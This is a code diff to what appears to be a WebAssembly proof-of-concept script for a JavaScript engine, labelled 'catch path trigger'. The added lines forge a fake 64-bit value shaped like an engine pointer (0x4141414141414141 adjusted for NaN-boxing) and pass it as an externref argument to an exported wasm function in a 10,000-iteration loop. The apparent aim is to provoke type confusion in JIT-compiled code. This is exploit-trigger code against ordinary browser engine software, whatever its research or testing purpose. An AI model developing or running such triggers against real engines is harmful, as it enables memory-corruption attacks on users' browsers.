@@ -31,6 +31,10 @@ const bytes_refined = new Uint8Array([
 ]);
 
 print("");
+const storage = new ArrayBuffer(8);
+const view2 = new DataView(storage);
+view2.setBigUint64(0, 0x4141414141414141n - (1n << 49n), true);
+const nonCellExternref = view2.getFloat64(0, true);
 print("=== STEP 2: catch path trigger ===");
 try {
     const mod2 = new WebAssembly.Module(bytes_refined);
@@ -39,7 +43,7 @@ try {
     print("STEP2_INSTANCE: ok");
     for (let i = 0; i < 10000; ++i) {
         try {
-            const r = inst2.exports.main(null);
+            const r = inst2.exports.main(nonCellExternref);
             if (i === 0) print("STEP2_RESULT_0: " + r);
         } catch(inner) {
             if (i === 0) print("STEP2_INNER: " + inner);
